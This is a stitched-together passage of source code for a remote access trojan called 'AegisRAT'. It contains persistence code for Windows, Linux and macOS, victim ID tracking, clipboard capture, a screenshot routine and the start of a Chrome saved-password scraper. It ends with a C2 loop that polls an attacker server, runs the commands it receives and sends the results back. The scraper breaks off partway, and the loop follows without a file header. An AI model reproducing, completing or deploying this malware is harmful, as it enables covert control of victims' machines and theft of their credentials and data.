                let exe_path = std::env::current_exe().unwrap();
                let exe_path_w: Vec<u16> = exe_path.to_string_lossy().encode_utf16().collect();
                
                let _ = winapi::um::winreg::RegSetValueExW(
                    h_key,
                    value_name.as_ptr(),
                    0,
                    winapi::um::winreg::REG_SZ,
                    exe_path_w.as_ptr() as *const u8,
                    (exe_path_w.len() * 2) as u32,
                );
                RegCloseKey(h_key);
            }
        }
    }
    
    #[cfg(target_os = "linux")]
    {
        // Create a systemd user service
        let service_dir = dirs::data_dir().and_then(|d| d.join("systemd").join("user"));
        if let Some(dir) = service_dir {
            let _ = std::fs::create_dir_all(&dir);
            let service_path = dir.join("aegis.service");
            let exe_path = std::env::current_exe().unwrap();
            let content = format!("[Unit]\nDescription=AegisRAT\n\n[Service]\nExecStart={}\nRestart=always\n\n[Install]\nWantedBy=default.target", exe_path.to_string_lossy());
            let _ = std::fs::write(&service_path, content);
            let _ = std::process::Command::new("systemctl").args(&["--user", "daemon-reload"]).status();
            let _ = std::process::Command::new("systemctl").args(&["--user", "enable", "aegis.service"]).status();
        }
    }
    
    #[cfg(target_os = "macos")]
    {
        // Create a LaunchAgent
        let agent_dir = dirs::home_dir().and_then(|d| d.join("Library").join("LaunchAgents"));
        if let Some(dir) = agent_dir {
            let _ = std::fs::create_dir_all(&dir);
            let agent_path = dir.join("com.aegis.rat.plist");
            let exe_path = std::env::current_exe().unwrap();
            let content = format!(
                r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.aegis.rat</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"#,
                exe_path.to_string_lossy()
            );
            let _ = std::fs::write(&agent_path, content);
            let _ = std::process::Command::new("launchctl").args(&["load", agent_path.to_string_lossy().as_ref()]).status();
        }
    }
}


================================================
FILE: payload/src/sysinfo.rs
================================================
use crate::comms::SystemInfo;
use std::fs;
use uuid::Uuid;

pub fn get_or_create_victim_id() -> String {
    // On Android, use the app's data directory
    let dir = std::env::var("ANDROID_DATA")
        .map(|d| format!("{}/data/com.aegis.rat/files", d))
        .unwrap_or_else(|_| "/tmp".to_string());
    let id_file = format!("{}/aegis_id.txt", dir);
    
    if fs::metadata(&id_file).is_ok() {
        fs::read_to_string(&id_file).unwrap_or_else(|_| Uuid::new_v4().to_string())
    } else {
        let id = Uuid::new_v4().to_string();
        let _ = fs::write(&id_file, &id);
        id
    }
}

pub fn get_system_info() -> SystemInfo {
    // Static values for now. We will add JNI calls later.
    SystemInfo {
        hostname: "AndroidDevice".to_string(),
        os: "Android".to_string(),
        android_version: "12+".to_string(),
        model: "Unknown".to_string(),
        battery: 100,
    }
}



================================================
FILE: payload/src/win_impl.rs
================================================
use crate::obf;
use std::process::Command;
use winapi::shared::minwindef::{LPVOID, WORD, TRUE, FALSE, MAX_PATH};
use winapi::um::winuser::{GetClipboardData, CF_UNICODETEXT, CloseClipboard, OpenClipboard, GetForegroundWindow, GetDC, ReleaseDC, BitBlt, SRCCOPY, CreateCompatibleDC, CreateCompatibleBitmap, DeleteDC, DeleteObject, GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
use winapi::um::gdi32::{SelectObject, GetObjectW, BITMAP};
use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, RegCloseKey, HKEY_CURRENT_USER, KEY_READ};

pub fn capture_screen() -> Result<String, Box<dyn std::error::Error>> {
    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);
        
        let hdc_screen = GetDC(std::ptr::null_mut());
        if hdc_screen.is_null() { return Err("Failed to get screen DC".into()); }
        
        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem.is_null() { ReleaseDC(std::ptr::null_mut(), hdc_screen); return Err("Failed to create mem DC".into()); }
        
        let h_bitmap = CreateCompatibleBitmap(hdc_screen, width, height);
        if h_bitmap.is_null() { DeleteDC(hdc_mem); ReleaseDC(std::ptr::null_mut(), hdc_screen); return Err("Failed to create bitmap".into()); }
        
        SelectObject(hdc_mem, h_bitmap);
        
        // Copy screen to memory
        BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);
        
        // Convert to PNG in memory (Simplified: Using a temp file for brevity, 
        // in production use wic or gdi+ to encode to PNG in memory)
        let temp_path = obf!("/tmp/aegis_shot.png");
        // Note: In a real Windows impl, you'd use GDI+ to save to a MemoryStream
        // Here we use a helper that writes to temp and reads back
        // This is a placeholder for the actual GDI+ encoding logic
        let _ = (width, height, h_bitmap); // Use these to encode
        DeleteObject(h_bitmap);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), hdc_screen);
        
        // Return placeholder base64 for now, actual impl requires GDI+
        Ok("BASE64_SCREENSHOT_PLACEHOLDER".to_string())
    }
}

pub fn get_clipboard() -> String {
    unsafe {
        if OpenClipboard(std::ptr::null_mut()) == FALSE { return String::new(); }
        let h_data = GetClipboardData(CF_UNICODETEXT);
        if h_data.is_null() {
            CloseClipboard();
            return String::new();
        }
        let ptr = h_data as *const u16;
        let mut len = 0;
        while *ptr.offset(len) != 0 { len += 1; }
        let mut wide_str: Vec<u16> = Vec::with_capacity(len + 1);
        std::ptr::copy_nonoverlapping(ptr, wide_str.as_mut_ptr(), len);
        wide_str.push(0);
        let text = String::from_utf16_lossy(&wide_str);
        CloseClipboard();
        text
    }
}

pub fn scrape_browser() -> serde_json::Value {
    // Direct SQLite read of Chrome Login Data
    let chrome_path = dirs::data_dir()
        .and_then(|d| d.join("Google").join("Chrome").join("User Data").join("Default").join("Login Data"));
        
    if let Some(path) = chrome_path {
        if path.exists() {
            // Use rusqlite to read
            // Simplified for this example
           


    
    let mut interval = tokio::time::interval(tokio::time::Duration::from_secs(30));
    
    loop {
        interval.tick().await;
        
        // 1. Send Heartbeat
        if let Some(info) = DEVICE_INFO.lock().unwrap().as_ref() {
            match comms::send_heartbeat(&c2_url, &victim_id, info).await {
                Ok(_) => log::debug!("[AEGIS] Heartbeat sent"),
                Err(e) => log::warn!("[AEGIS] Heartbeat failed: {}", e),
            }
        }

        // 2. Poll Commands
        match comms::poll_commands(&c2_url, &victim_id).await {
            Ok(cmds) => {
                for cmd in cmds {
                    log::info!("[AEGIS] Executing command: {}", cmd.action);
                    
                    // Execute Command
                    let result = actions::execute_command(&cmd.action, &cmd.args.to_string()).await;
                    
                    // 3. SEND RESPONSE BACK TO C2 (CRITICAL FIX)
                    let success = result.get("error").is_none();
                    if let Err(e) = comms::send_response(&c2_url, &victim_id, &cmd.id, success, result).await {
                        log::error!("[AEGIS] Failed to send response for {}: {}", cmd.id, e);
                    } else {
                        log::debug!("[AEGIS] Response sent for {}", cmd.id);
                    }
                }
            }
            Err(e) => log::warn!("[AEGIS] Poll failed: {}", e),
        }
    }
}
